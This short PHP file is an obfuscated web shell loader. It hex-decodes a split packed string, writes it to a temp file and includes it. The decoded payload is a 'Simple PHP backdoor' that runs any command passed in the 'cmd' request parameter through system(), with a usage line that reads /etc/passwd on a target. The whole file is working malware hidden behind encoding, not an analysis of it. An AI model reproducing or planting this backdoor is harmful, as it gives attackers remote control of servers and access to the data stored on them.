<?php
$tmp=tempnam('/tmp','FOO');
$c=pack('H*','3'.'f3e0a3c212d2d2053696d706c6520504850206261636b646f6f7220627920444b2028687474703a2f2f6d69636861656c6461772e6f726729202d2d3e0a0a3c3f7068700a0a696628697373657428245f524551554553545b27636d64275d29297b0a20202020202020206563686f20223c7072653e223b0a202020202020202024636d64203d2028245f524551554553545b27636d64275d293b0a202020202020202073797374656d2824636d64293b0a20202020202020206563686f20223c2f7072653e223b0a20202020202020206469653b0a7d0a0a3f3e0a0a55736167653a20687474703a2f2f7461726765742e636f6d2f73696d706c652d6261636b646f6f722e7068703f636d643d6361742b2f6574632f7061737377640a0a3c212d2d20202020687474703a2f2f6d69636861656c6461772e6f726720202032303036202020202d2d3e0a0a');
file_put_contents($tmp, $c);
include $tmp;